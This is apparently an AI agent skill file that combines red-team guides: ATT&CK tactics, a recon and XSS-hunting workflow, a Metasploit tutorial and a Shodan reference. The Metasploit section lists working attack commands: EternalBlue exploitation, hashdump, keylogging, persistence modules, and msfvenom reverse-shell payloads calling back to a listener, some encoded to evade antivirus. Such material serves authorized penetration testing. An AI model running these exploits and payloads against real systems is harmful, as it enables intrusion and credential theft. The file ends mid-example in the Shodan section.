---
name: red-team-mastery
description: Comprehensive Power SOP for Red Team Mastery. Combined from multiple specialized skills.
---

# Red Team Mastery Master SOP



--- SECTION: RED-TEAM-OPERATIONS ---


# Red Team Operations

Red team methodology, C2 infrastructure, and adversary emulation.

## When to Use

Use this skill when working on security expert tasks related to red team operations.

## Key Concepts

1. **Best Practices**: Follow industry standards
2. **Implementation**: Step-by-step guidance
3. **Examples**: Real-world applications

## Guidelines

- Start with understanding requirements
- Apply proven patterns
- Test and validate results


--- SECTION: RED-TEAM-TACTICS ---


# Red Team Tactics

> Adversary simulation principles based on MITRE ATT&CK framework.

---

## 1. MITRE ATT&CK Phases

### Attack Lifecycle

```
RECONNAISSANCE → INITIAL ACCESS → EXECUTION → PERSISTENCE
       ↓              ↓              ↓            ↓
   PRIVILEGE ESC → DEFENSE EVASION → CRED ACCESS → DISCOVERY
       ↓              ↓              ↓            ↓
LATERAL MOVEMENT → COLLECTION → C2 → EXFILTRATION → IMPACT
```

### Phase Objectives

| Phase | Objective |
|-------|-----------|
| **Recon** | Map attack surface |
| **Initial Access** | Get first foothold |
| **Execution** | Run code on target |
| **Persistence** | Survive reboots |
| **Privilege Escalation** | Get admin/root |
| **Defense Evasion** | Avoid detection |
| **Credential Access** | Harvest credentials |
| **Discovery** | Map internal network |
| **Lateral Movement** | Spread to other systems |
| **Collection** | Gather target data |
| **C2** | Maintain command channel |
| **Exfiltration** | Extract data |

---

## 2. Reconnaissance Principles

### Passive vs Active

| Type | Trade-off |
|------|-----------|
| **Passive** | No target contact, limited info |
| **Active** | Direct contact, more detection risk |

### Information Targets

| Category | Value |
|----------|-------|
| Technology stack | Attack vector selection |
| Employee info | Social engineering |
| Network ranges | Scanning scope |
| Third parties | Supply chain attack |

---

## 3. Initial Access Vectors

### Selection Criteria

| Vector | When to Use |
|--------|-------------|
| **Phishing** | Human target, email access |
| **Public exploits** | Vulnerable services exposed |
| **Valid credentials** | Leaked or cracked |
| **Supply chain** | Third-party access |

---

## 4. Privilege Escalation Principles

### Windows Targets

| Check | Opportunity |
|-------|-------------|
| Unquoted service paths | Write to path |
| Weak service permissions | Modify service |
| Token privileges | Abuse SeDebug, etc. |
| Stored credentials | Harvest |

### Linux Targets

| Check | Opportunity |
|-------|-------------|
| SUID binaries | Execute as owner |
| Sudo misconfiguration | Command execution |
| Kernel vulnerabilities | Kernel exploits |
| Cron jobs | Writable scripts |

---

## 5. Defense Evasion Principles

### Key Techniques

| Technique | Purpose |
|-----------|---------|
| LOLBins | Use legitimate tools |
| Obfuscation | Hide malicious code |
| Timestomping | Hide file modifications |
| Log clearing | Remove evidence |

### Operational Security

- Work during business hours
- Mimic legitimate traffic patterns
- Use encrypted channels
- Blend with normal behavior

---

## 6. Lateral Movement Principles

### Credential Types

| Type | Use |
|------|-----|
| Password | Standard auth |
| Hash | Pass-the-hash |
| Ticket | Pass-the-ticket |
| Certificate | Certificate auth |

### Movement Paths

- Admin shares
- Remote services (RDP, SSH, WinRM)
- Exploitation of internal services

---

## 7. Active Directory Attacks

### Attack Categories

| Attack | Target |
|--------|--------|
| Kerberoasting | Service account passwords |
| AS-REP Roasting | Accounts without pre-auth |
| DCSync | Domain credentials |
| Golden Ticket | Persistent domain access |

---

## 8. Reporting Principles

### Attack Narrative

Document the full attack chain:
1. How initial access was gained
2. What techniques were used
3. What objectives were achieved
4. Where detection failed

### Detection Gaps

For each successful technique:
- What should have detected it?
- Why didn't detection work?
- How to improve detection

---

## 9. Ethical Boundaries

### Always

- Stay within scope
- Minimize impact
- Report immediately if real threat found
- Document all actions

### Never

- Destroy production data
- Cause denial of service (unless scoped)
- Access beyond proof of concept
- Retain sensitive data

---

## 10. Anti-Patterns

| ❌ Don't | ✅ Do |
|----------|-------|
| Rush to exploitation | Follow methodology |
| Cause damage | Minimize impact |
| Skip reporting | Document everything |
| Ignore scope | Stay within boundaries |

---

> **Remember:** Red team simulates attackers to improve defenses, not to cause harm.


--- SECTION: RED-TEAM-TOOLS ---


# Red Team Tools and Methodology

## Purpose

Implement proven methodologies and tool workflows from top security researchers for effective reconnaissance, vulnerability discovery, and bug bounty hunting. Automate common tasks while maintaining thorough coverage of attack surfaces.

## Inputs/Prerequisites

- Target scope definition (domains, IP ranges, applications)
- Linux-based attack machine (Kali, Ubuntu)
- Bug bounty program rules and scope
- Tool dependencies installed (Go, Python, Ruby)
- API keys for various services (Shodan, Censys, etc.)

## Outputs/Deliverables

- Comprehensive subdomain enumeration
- Live host discovery and technology fingerprinting
- Identified vulnerabilities and attack vectors
- Automated recon pipeline outputs
- Documented findings for reporting

## Core Workflow

### 1. Project Tracking and Acquisitions

Set up reconnaissance tracking:

```bash
# Create project structure
mkdir -p target/{recon,vulns,reports}
cd target

# Find acquisitions using Crunchbase
# Search manually for subsidiary companies

# Get ASN for targets
amass intel -org "Target Company" -src

# Alternative ASN lookup
curl -s "https://bgp.he.net/search?search=targetcompany&commit=Search"
```

### 2. Subdomain Enumeration

Comprehensive subdomain discovery:

```bash
# Create wildcards file
echo "target.com" > wildcards

# Run Amass passively
amass enum -passive -d target.com -src -o amass_passive.txt

# Run Amass actively
amass enum -active -d target.com -src -o amass_active.txt

# Use Subfinder
subfinder -d target.com -silent -o subfinder.txt

# Asset discovery
cat wildcards | assetfinder --subs-only | anew domains.txt

# Alternative subdomain tools
findomain -t target.com -o

# Generate permutations with dnsgen
cat domains.txt | dnsgen - | httprobe > permuted.txt

# Combine all sources
cat amass_*.txt subfinder.txt | sort -u > all_subs.txt
```

### 3. Live Host Discovery

Identify responding hosts:

```bash
# Check which hosts are live with httprobe
cat domains.txt | httprobe -c 80 --prefer-https | anew hosts.txt

# Use httpx for more details
cat domains.txt | httpx -title -tech-detect -status-code -o live_hosts.txt

# Alternative with massdns
massdns -r resolvers.txt -t A -o S domains.txt > resolved.txt
```

### 4. Technology Fingerprinting

Identify technologies for targeted attacks:

```bash
# Whatweb scanning
whatweb -i hosts.txt -a 3 -v > tech_stack.txt

# Nuclei technology detection
nuclei -l hosts.txt -t technologies/ -o tech_nuclei.txt

# Wappalyzer (if available)
# Browser extension for manual review
```

### 5. Content Discovery

Find hidden endpoints and files:

```bash
# Directory bruteforce with ffuf
ffuf -ac -v -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Historical URLs from Wayback
waybackurls target.com | tee wayback.txt

# Find all URLs with gau
gau target.com | tee all_urls.txt

# Parameter discovery
cat all_urls.txt | grep "=" | sort -u > params.txt

# Generate custom wordlist from historical data
cat all_urls.txt | unfurl paths | sort -u > custom_wordlist.txt
```

### 6. Application Analysis (Jason Haddix Method)

**Heat Map Priority Areas:**

1. **File Uploads** - Test for injection, XXE, SSRF, shell upload
2. **Content Types** - Filter Burp for multipart forms
3. **APIs** - Look for hidden methods, lack of auth
4. **Profile Sections** - Stored XSS, custom fields
5. **Integrations** - SSRF through third parties
6. **Error Pages** - Exotic injection points

**Analysis Questions:**
- How does the app pass data? (Params, API, Hybrid)
- Where does the app talk about users? (UID, UUID endpoints)
- Does the site have multi-tenancy or user levels?
- Does it have a unique threat model?
- How does the site handle XSS/CSRF?
- Has the site had past writeups/exploits?

### 7. Automated XSS Hunting

```bash
# ParamSpider for parameter extraction
python3 paramspider.py --domain target.com -o params.txt

# Filter with Gxss
cat params.txt | Gxss -p test

# Dalfox for XSS testing
cat params.txt | dalfox pipe --mining-dict params.txt -o xss_results.txt

# Alternative workflow
waybackurls target.com | grep "=" | qsreplace '"><script>alert(1)</script>' | while read url; do
    curl -s "$url" | grep -q 'alert(1)' && echo "$url"
done > potential_xss.txt
```

### 8. Vulnerability Scanning

```bash
# Nuclei comprehensive scan
nuclei -l hosts.txt -t ~/nuclei-templates/ -o nuclei_results.txt

# Check for common CVEs
nuclei -l hosts.txt -t cves/ -o cve_results.txt

# Web vulnerabilities
nuclei -l hosts.txt -t vulnerabilities/ -o vuln_results.txt
```

### 9. API Enumeration

**Wordlists for API fuzzing:**

```bash
# Enumerate API endpoints
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Test API versions
ffuf -u https://target.com/api/v1/FUZZ -w api_wordlist.txt
ffuf -u https://target.com/api/v2/FUZZ -w api_wordlist.txt

# Check for hidden methods
for method in GET POST PUT DELETE PATCH; do
    curl -X $method https://target.com/api/users -v
done
```

### 10. Automated Recon Script

```bash
#!/bin/bash
domain=$1

if [[ -z $domain ]]; then
    echo "Usage: ./recon.sh <domain>"
    exit 1
fi

mkdir -p "$domain"

# Subdomain enumeration
echo "[*] Enumerating subdomains..."
subfinder -d "$domain" -silent > "$domain/subs.txt"

# Live host discovery
echo "[*] Finding live hosts..."
cat "$domain/subs.txt" | httpx -title -tech-detect -status-code > "$domain/live.txt"

# URL collection
echo "[*] Collecting URLs..."
cat "$domain/live.txt" | waybackurls > "$domain/urls.txt"

# Nuclei scanning
echo "[*] Running Nuclei..."
nuclei -l "$domain/live.txt" -o "$domain/nuclei.txt"

echo "[+] Recon complete!"
```

## Quick Reference

### Essential Tools

| Tool | Purpose |
|------|---------|
| Amass | Subdomain enumeration |
| Subfinder | Fast subdomain discovery |
| httpx/httprobe | Live host detection |
| ffuf | Content discovery |
| Nuclei | Vulnerability scanning |
| Burp Suite | Manual testing |
| Dalfox | XSS automation |
| waybackurls | Historical URL mining |

### Key API Endpoints to Check

```
/api/v1/users
/api/v1/admin
/api/v1/profile
/api/users/me
/api/config
/api/debug
/api/swagger
/api/graphql
```

### XSS Filter Testing

```html
<!-- Test encoding handling -->
<h1><img><table>
<script>
%3Cscript%3E
%253Cscript%253E
%26lt;script%26gt;
```

## Constraints

- Respect program scope boundaries
- Avoid DoS or fuzzing on production without permission
- Rate limit requests to avoid blocking
- Some tools may generate false positives
- API keys required for full functionality of some tools

## Examples

### Example 1: Quick Subdomain Recon

```bash
subfinder -d target.com | httpx -title | tee results.txt
```

### Example 2: XSS Hunting Pipeline

```bash
waybackurls target.com | grep "=" | qsreplace "test" | httpx -silent | dalfox pipe
```

### Example 3: Comprehensive Scan

```bash
# Full recon chain
amass enum -d target.com | httpx | nuclei -t ~/nuclei-templates/
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Rate limited | Use proxy rotation, reduce concurrency |
| Too many results | Focus on specific technology stacks |
| False positives | Manually verify findings before reporting |
| Missing subdomains | Combine multiple enumeration sources |
| API key errors | Verify keys in config files |
| Tools not found | Install Go tools with `go install` |


--- SECTION: METASPLOIT-FRAMEWORK ---


# Metasploit Framework

## Purpose

Leverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.

## Prerequisites

### Required Tools
```bash
# Metasploit comes pre-installed on Kali Linux
# For other systems:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Start PostgreSQL for database support
sudo systemctl start postgresql
sudo msfdb init
```

### Required Knowledge
- Network and system fundamentals
- Understanding of vulnerabilities and exploits
- Basic programming concepts
- Target enumeration techniques

### Required Access
- Written authorization for testing
- Network access to target systems
- Understanding of scope and rules of engagement

## Outputs and Deliverables

1. **Exploitation Evidence** - Screenshots and logs of successful compromises
2. **Session Logs** - Command history and extracted data
3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references
4. **Post-Exploitation Artifacts** - Credentials, files, and system information

## Core Workflow

### Phase 1: MSFConsole Basics

Launch and navigate the Metasploit console:

```bash
# Start msfconsole
msfconsole

# Quiet mode (skip banner)
msfconsole -q

# Basic navigation commands
msf6 > help                    # Show all commands
msf6 > search [term]           # Search modules
msf6 > use [module]            # Select module
msf6 > info                    # Show module details
msf6 > show options            # Display required options
msf6 > set [OPTION] [value]    # Configure option
msf6 > run / exploit           # Execute module
msf6 > back                    # Return to main console
msf6 > exit                    # Exit msfconsole
```

### Phase 2: Module Types

Understand the different module categories:

```bash
# 1. Exploit Modules - Target specific vulnerabilities
msf6 > show exploits
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Payload Modules - Code executed after exploitation
msf6 > show payloads
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 3. Auxiliary Modules - Scanning, fuzzing, enumeration
msf6 > show auxiliary
msf6 > use auxiliary/scanner/smb/smb_version

# 4. Post-Exploitation Modules - Actions after compromise
msf6 > show post
msf6 > use post/windows/gather/hashdump

# 5. Encoders - Obfuscate payloads
msf6 > show encoders
msf6 > set ENCODER x86/shikata_ga_nai

# 6. Nops - No-operation padding for buffer overflows
msf6 > show nops

# 7. Evasion - Bypass security controls
msf6 > show evasion
```

### Phase 3: Searching for Modules

Find appropriate modules for targets:

```bash
# Search by name
msf6 > search eternalblue

# Search by CVE
msf6 > search cve:2017-0144

# Search by platform
msf6 > search platform:windows type:exploit

# Search by type and keyword
msf6 > search type:auxiliary smb

# Filter by rank (excellent, great, good, normal, average, low, manual)
msf6 > search rank:excellent

# Combined search
msf6 > search type:exploit platform:linux apache

# View search results columns:
# Name, Disclosure Date, Rank, Check (if it can verify vulnerability), Description
```

### Phase 4: Configuring Exploits

Set up an exploit for execution:

```bash
# Select exploit module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# View required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target host
msf6 exploit(...) > set RHOSTS 192.168.1.100

# Set target port (if different from default)
msf6 exploit(...) > set RPORT 445

# View compatible payloads
msf6 exploit(...) > show payloads

# Set payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local host for reverse connection
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# View all options again to verify
msf6 exploit(...) > show options

# Check if target is vulnerable (if supported)
msf6 exploit(...) > check

# Execute exploit
msf6 exploit(...) > exploit
# or
msf6 exploit(...) > run
```

### Phase 5: Payload Types

Select appropriate payload for the situation:

```bash
# Singles - Self-contained, no staging
windows/shell_reverse_tcp
linux/x86/shell_bind_tcp

# Stagers - Small payload that downloads larger stage
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/bind_tcp

# Stages - Downloaded by stager, provides full functionality
# Meterpreter, VNC, shell

# Payload naming convention:
# [platform]/[architecture]/[payload_type]/[connection_type]
# Examples:
windows/x64/meterpreter/reverse_tcp
linux/x86/shell/bind_tcp
php/meterpreter/reverse_tcp
java/meterpreter/reverse_https
android/meterpreter/reverse_tcp
```

### Phase 6: Meterpreter Session

Work with Meterpreter post-exploitation:

```bash
# After successful exploitation, you get Meterpreter prompt
meterpreter >

# System Information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# File System Operations
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download file.txt /tmp/
meterpreter > upload /tmp/tool.exe C:\\

# Process Management
meterpreter > ps
meterpreter > migrate [PID]
meterpreter > kill [PID]

# Networking
meterpreter > ipconfig
meterpreter > netstat
meterpreter > route
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1

# Privilege Escalation
meterpreter > getsystem
meterpreter > getprivs

# Credential Harvesting
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector

# Screenshots and Keylogging
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Shell Access
meterpreter > shell
C:\Windows\system32> whoami
C:\Windows\system32> exit
meterpreter >

# Background Session
meterpreter > background
msf6 exploit(...) > sessions -l
msf6 exploit(...) > sessions -i 1
```

### Phase 7: Auxiliary Modules

Use auxiliary modules for reconnaissance:

```bash
# SMB Version Scanner
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Port Scanner
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set PORTS 1-1000
msf6 auxiliary(...) > run

# SSH Version Scanner
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# FTP Anonymous Login
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# HTTP Directory Scanner
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# Brute Force Modules
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(...) > run
```

### Phase 8: Post-Exploitation Modules

Run post modules on active sessions:

```bash
# List sessions
msf6 > sessions -l

# Run post module on specific session
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(...) > run

# Or run directly from Meterpreter
meterpreter > run post/windows/gather/hashdump

# Common Post Modules
# Credential Gathering
post/windows/gather/credentials/credential_collector
post/windows/gather/lsa_secrets
post/windows/gather/cachedump
post/multi/gather/ssh_creds

# System Enumeration
post/windows/gather/enum_applications
post/windows/gather/enum_logged_on_users
post/windows/gather/enum_shares
post/linux/gather/enum_configs

# Privilege Escalation
post/windows/escalate/getsystem
post/multi/recon/local_exploit_suggester

# Persistence
post/windows/manage/persistence_exe
post/linux/manage/sshkey_persistence

# Pivoting
post/multi/manage/autoroute
```

### Phase 9: Payload Generation with msfvenom

Create standalone payloads:

```bash
# Basic Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# WAR file (Tomcat)
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk

# Encoded payload (evade AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# List available formats
msfvenom --list formats

# List available encoders
msfvenom --list encoders
```

### Phase 10: Setting Up Handlers

Configure listener for incoming connections:

```bash
# Manual handler setup
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# The -j flag runs as background job
msf6 > jobs -l

# When payload executes on target, session opens
[*] Meterpreter session 1 opened

# Interact with session
msf6 > sessions -i 1
```

## Quick Reference

### Essential MSFConsole Commands

| Command | Description |
|---------|-------------|
| `search [term]` | Search for modules |
| `use [module]` | Select a module |
| `info` | Display module information |
| `show options` | Show configurable options |
| `set [OPT] [val]` | Set option value |
| `setg [OPT] [val]` | Set global option |
| `run` / `exploit` | Execute module |
| `check` | Verify target vulnerability |
| `back` | Deselect module |
| `sessions -l` | List active sessions |
| `sessions -i [N]` | Interact with session |
| `jobs -l` | List background jobs |
| `db_nmap` | Run nmap with database |

### Meterpreter Essential Commands

| Command | Description |
|---------|-------------|
| `sysinfo` | System information |
| `getuid` | Current user |
| `getsystem` | Attempt privilege escalation |
| `hashdump` | Dump password hashes |
| `shell` | Drop to system shell |
| `upload/download` | File transfer |
| `screenshot` | Capture screen |
| `keyscan_start` | Start keylogger |
| `migrate [PID]` | Move to another process |
| `background` | Background session |
| `portfwd` | Port forwarding |

### Common Exploit Modules

```bash
# Windows
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms08_067_netapi
exploit/windows/http/iis_webdav_upload_asp
exploit/windows/local/bypassuac

# Linux
exploit/linux/ssh/sshexec
exploit/linux/local/overlayfs_priv_esc
exploit/multi/http/apache_mod_cgi_bash_env_exec

# Web Applications
exploit/multi/http/tomcat_mgr_upload
exploit/unix/webapp/wp_admin_shell_upload
exploit/multi/http/jenkins_script_console
```

## Constraints and Limitations

### Legal Requirements
- Only use on systems you own or have written authorization to test
- Document all testing activities
- Follow rules of engagement
- Report all findings to appropriate parties

### Technical Limitations
- Modern AV/EDR may detect Metasploit payloads
- Some exploits require specific target configurations
- Firewall rules may block reverse connections
- Not all exploits work on all target versions

### Operational Security
- Use encrypted channels (reverse_https) when possible
- Clean up artifacts after testing
- Avoid detection by monitoring systems
- Limit post-exploitation to agreed scope

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Database not connected | Run `sudo msfdb init`, start PostgreSQL, then `db_connect` |
| Exploit fails/no session | Run `check`; verify payload architecture; check firewall; try different payloads |
| Session dies immediately | Migrate to stable process; use stageless payload; check AV; use AutoRunScript |
| Payload detected by AV | Use encoding `-e x86/shikata_ga_nai -i 10`; use evasion modules; custom templates |


--- SECTION: SHODAN-RECONNAISSANCE ---


# Shodan Reconnaissance and Pentesting

## Purpose

Provide systematic methodologies for leveraging Shodan as a reconnaissance tool during penetration testing engagements. This skill covers the Shodan web interface, command-line interface (CLI), REST API, search filters, on-demand scanning, and network monitoring capabilities for discovering exposed services, vulnerable systems, and IoT devices.

## Inputs / Prerequisites

- **Shodan Account**: Free or paid account at shodan.io
- **API Key**: Obtained from Shodan account dashboard
- **Target Information**: IP addresses, domains, or network ranges to investigate
- **Shodan CLI**: Python-based command-line tool installed
- **Authorization**: Written permission for reconnaissance on target networks

## Outputs / Deliverables

- **Asset Inventory**: List of discovered hosts, ports, and services
- **Vulnerability Report**: Identified CVEs and exposed vulnerable services
- **Banner Data**: Service banners revealing software versions
- **Network Mapping**: Geographic and organizational distribution of assets
- **Screenshot Gallery**: Visual reconnaissance of exposed interfaces
- **Exported Data**: JSON/CSV files for further analysis

## Core Workflow

### 1. Setup and Configuration

#### Install Shodan CLI
```bash
# Using pip
pip install shodan

# Or easy_install
easy_install shodan

# On BlackArch/Arch Linux
sudo pacman -S python-shodan
```

#### Initialize API Key
```bash
# Set your API key
shodan init YOUR_API_KEY

# Verify setup
shodan info
# Output: Query credits available: 100
#         Scan credits available: 100
```

#### Check Account Status
```bash
# View credits and plan info
shodan info

# Check your external IP
shodan myip

# Check CLI version
shodan version
```

### 2. Basic Host Reconnaissance

#### Query Single Host
```bash
# Get all information about an IP
shodan host 1.1.1.1

# Example output:
# 1.1.1.1
# Hostnames: one.one.one.one
# Country: Australia
# Organization: Mountain View Communications
# Number of open ports: 3
# Ports:
#   53/udp
#   80/tcp
#   443/tcp
```

#### Check if Host is Honeypot
```bash
# Get honeypot probability score
shodan honeyscore 192.168.1.100

# Output: Not a honeypot
#         Score: 0.3
```

### 3. Search Queries

#### Basic Search (Free)
```bash
# Simple keyword search (no credits consumed)
shodan search apache

# Specify output fields
shodan search --fields ip_str,port,os smb
```

#### Filtered Search (1 Credit)
```bash
# Product-specific search
shodan search product:mongodb

# Search with multiple filters
shodan search product:nginx country:US city:"New York"
```

#### Count Results
```bash
# Get result count without consuming credits
shodan count openssh
# Output: 23128

shodan count openssh 7
# Output: 219
```

#### Download Results
```bash
# Download 1000 results (default)
shodan download results.json.gz "apache country:US"

# Download specific number of results
shodan download --limit 5000 results.json.gz "nginx"

# Download all available results
shodan download --limit -1 all_results.json.gz "query"
```

#### Parse Downloaded Data
```bash
# Extract specific fields from downloaded data
shodan parse --fields ip_str,port,hostnames results.json.gz

# Filter by specific criteria
shodan parse --fields location.country_code3,ip_str -f port:22 results.json.gz

# Export to CSV format
shodan parse --fields ip_str,port,org --separator , results.json.gz > results.csv
```

### 4. Search Filters Reference

#### Network Filters
```
ip:1.2.3.4                  # Specific IP address
net:192.168.0.0/24          # Network range (CIDR)
hostname:example.com        # Hostname contains
port:22                     # Specific port
asn:AS15169                 # Autonomous System Number
```

#### Geographic Filters
```
country:US                  # Two-letter country code
country:"United States"     # Full country name
city:"San Francisco"        # City name
state:CA                    # State/region
postal:94102                # Postal/ZIP code
geo:37.7,-122.4             # Lat/long coordinates
```

#### Organization Filters
```
org:"Google"                # Organization name
isp:"Comcast"               # ISP name
```

#### Service/Product Filters
```
product:nginx               # Software product
version:1.14.0              # Software version
os:"Windows Server 2019"    # Operating system
http.title:"Dashboard"      # HTTP page title
http.html:"login"           # HTML content
http.status:200             # HTTP status code
ssl.cert.subject.cn:*.example.com  # SSL certificate
ssl:true                    # Has SSL enabled
```

#### Vulnerability Filters
```
vuln:CVE-2019-0708          # Specific CVE
has_vuln:true               # Has any vulnerability
```

#### Screenshot Filters
```
has_screenshot:true         # Has screenshot available
screenshot.label:webcam     # Screenshot type
```

### 5. On-Demand Scanning

#### Submit Scan
```bash
# Scan single IP (1 credit per IP)
shodan scan submit 192.168.1.100

# Scan with verbose output (shows scan ID)
shodan scan submit --verbose 192.168.1.100

# Scan and save results
shodan scan submit --filename scan_results.json.gz 192.168.1.100
```

#### Monitor Scan Status
```bash
# List recent scans
shodan scan list

# Check specific scan status
shodan scan status SCAN_ID

# Download scan results later
shodan download --limit -1 results.json.gz scan:SCAN_ID
```

#### Available Scan Protocols
```bash
# List available protocols/modules
shodan scan protocols
```

### 6. Statistics and Analysis

#### Get Search Statistics
```bash
# Default statistics (top 10 countries, orgs)
shodan stats nginx

# Custom facets
shodan stats --facets domain,port,asn --limit 5 nginx

# Save to CSV
shodan stats --facets country,org -O stats.csv apache
```

### 7. Network Monitoring

#### Setup Alerts (Web Interface)
```
1. Navigate to Monitor Dashboard
2. Add IP, range, or domain to monitor
3. Configure notification service (email, Slack, webhook)
4. Select trigger events (new service, vulnerability, etc.)
5. View dashboard for exposed services
```

### 8. REST API Usage

#### Direct API Calls
```bash
# Get API info
curl -s "https://api.shodan.io/api-info?key=YOUR_KEY" | jq

# Host lookup
curl -s "https://api.shodan.io/shodan/host/1.1.1.1?key=YOUR_KEY" | jq

# Search query
curl -s "https://api.shodan.io/shodan/host/search?key=YOUR_KEY&query=apache" | jq
```

#### Python Library
```python
import shodan

api = shodan.Shodan('YOUR_API_KEY')

# Search
results = api.search('apache')
print(f'Results found: {results["total"]}')
for result in results['matches']:
    print(f'IP: {result["ip_str"]}')

# Host lookup
host = api.host('1.1.1.1')
print(f'IP: {host["ip_str"]}')
print(f'Organization: {host.get("org", "n/a")}')
for item in host['data']:
    print(f'Port: {item["port"]}')
```

## Quick Reference

### Essential CLI Commands

| Command | Description | Credits |
|---------|-------------|---------|
| `shodan init KEY` | Initialize API key | 0 |
| `shodan info` | Show account info | 0 |
| `shodan myip` | Show your IP | 0 |
| `shodan host IP` | Host details | 0 |
| `shodan count QUERY` | Result count | 0 |
| `shodan search QUERY` | Basic search | 0* |
| `shodan download FILE QUERY` | Save results | 1/100 results |
| `shodan parse FILE` | Extract data | 0 |
| `shodan stats QUERY` | Statistics | 1 |
| `shodan scan submit IP` | On-demand scan | 1/IP |
| `shodan honeyscore IP` | Honeypot check | 0 |

*Filters consume 1 credit per query

### Common Search Queries

| Purpose | Query |
|---------|-------|
| Find webcams | `webcam has_screenshot:true` |
| MongoDB databases | `product:mongodb` |
| Redis servers | `product:redis` |
| Elasticsearch | `product:elastic port:9200` |
| Default passwords | `"default password"` |
| Vulnerable RDP | `port:3389 vuln:CVE-2019-0708` |
| Industrial systems | `port:502 modbus` |
| Cisco devices | `product:cisco` |
| Open VNC | `port:5900 authentication disabled` |
| Exposed FTP | `port:21 anonymous` |
| WordPress sites | `http.component:wordpress` |
| Printers | `"HP-ChaiSOE" port:80` |
| Cameras (RTSP) | `port:554 has_screenshot:true` |
| Jenkins servers | `X-Jenkins port:8080` |
| Docker APIs | `port:2375 product:docker` |

### Useful Filter Combinations

| Scenario | Query |
|---------|-------|
| Target org recon | `org:"Company Name"` |
| Domain enumeration | `hostname:example.com` |
| Network range scan | `net:192.168.0.0/24` |
| SSL cert search | `ssl.cert.subject.cn:*.target.com` |
| Vulnerable servers | `vuln:CVE-2021-44228 country:US` |
| Exposed admin panels | `http.title:"admin" port:443` |
| Database exposure | `port:3306,5432,27017,6379` |

### Credit System

| Action | Credit Type | Cost |
|--------|-------------|------|
| Basic search | Query | 0 (no filters) |
| Filtered search | Query | 1 |
| Download 100 results | Query | 1 |
| Generate report | Query | 1 |
| Scan 1 IP | Scan | 1 |
| Network monitoring | Monitored IPs | Depends on plan |

## Constraints and Limitations

### Operational Boundaries
- Rate limited to 1 request per second
- Scan results not immediate (asynchronous)
- Cannot re-scan same IP within 24 hours (non-Enterprise)
- Free accounts have limited credits
- Some data requires paid subscription

### Data Freshness
- Shodan crawls continuously but data may be days/weeks old
- On-demand scans provide current data but cost credits
- Historical data available with paid plans

### Legal Requirements
- Only perform reconnaissance on authorized targets
- Passive reconnaissance generally legal but verify jurisdiction
- Active scanning (scan submit) requires authorization
- Document all reconnaissance activities

## Examples

### Example 1: Organization Reconnaissance
```bash
# Find all hosts belonging to target organization
shodan search 'org:"Target Company"'

